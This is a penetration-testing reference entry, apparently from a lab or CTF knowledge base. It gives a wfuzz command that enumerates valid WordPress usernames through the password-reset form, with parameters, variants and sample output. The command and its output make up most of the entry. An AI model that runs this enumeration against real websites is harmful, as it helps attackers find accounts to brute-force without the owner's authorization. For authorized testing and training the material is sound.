---
id: 8f7a9ebd-15fd-4025-b61c-80c172483c6b
type: command
executor: bash
data: >-
  wfuzz --hc 200 -w $_USERS_TXT -u
  'http://$_TARGET_IP/wp-login.php?action=lostpassword' -d
  'user_login=FUZZ&redirect_to=&wp-submit=Get+New+Password'
output: >-
  root@kali:~# wfuzz --hc 200 -c -w names.txt -u
  'http://10.10.10.10/wp-login.php?action=lostpassword' -d
  'user_login=FUZZ&redirect_to=&wp-submit=Get+New+Password'


  ********************************************************

  * Wfuzz 2.4 - The Web Fuzzer                           *

  ********************************************************


  Target: http://10.10.10.10/wp-login.php?action=lostpassword

  Total requests: 10163


  ===================================================================

  ID           Response   Lines    Word     Chars       Payload

  ===================================================================


  000002955:   500        110 L    305 W    3068 Ch     "elliot"


  Total time: 184.0298

  Processed Requests: 10163

  Filtered Requests: 10162
created_at: '2019-12-04T23:27:07.447960+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - web
  - brute-force
verified: true
validated: true
---

# wfuzz-brute-force-http-post-form

## Command

```bash
wfuzz --hc 200 -w $_USERS_TXT -u 'http://$_TARGET_IP/wp-login.php?action=lostpassword' -d 'user_login=FUZZ&redirect_to=&wp-submit=Get+New+Password'
```

## Description

Fuzzes POST data in a form (e.g., WordPress password reset) to enumerate valid usernames by hiding invalid (200) responses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --hc 200 | Hide 200 OK responses (invalid users) | Yes |
| -w $_USERS_TXT | Username wordlist | Yes |
| -u | Target URL | Yes |
| -d | POST data with FUZZ | Yes |
| $_TARGET_IP | Target IP | Yes |

## Examples

### Basic Usage

```bash
wfuzz --hc 200 -w users.txt -u 'http://10.10.10.10/reset' -d 'user=FUZZ'
```

### With Headers

```bash
wfuzz --hc 200 -w users.txt -u 'http://10.10.10.10/reset' -d 'user=FUZZ' -H 'Cookie: session=abc'
```

## Expected Output

Responses for valid users, e.g., 500 for 'elliot'.

## Related

- [[procedures/Brute-Force-Valid-Users-via-Forgotten-Password-Form]]
- [[tools/Wfuzz]]
